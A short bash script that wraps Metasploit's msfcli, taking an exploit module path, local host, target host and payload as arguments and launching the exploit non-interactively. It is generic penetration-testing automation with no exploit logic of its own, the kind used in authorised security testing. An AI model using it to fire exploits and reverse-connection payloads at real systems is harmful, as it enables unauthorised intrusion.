#!/bin/bash

vulPath=$1
lhost=$2
rhost=$3
payload=$4

msfcli $vulPath lhost=$lhost rhost=$rhost payload=$payload E <<!END!
exit -y
!END!
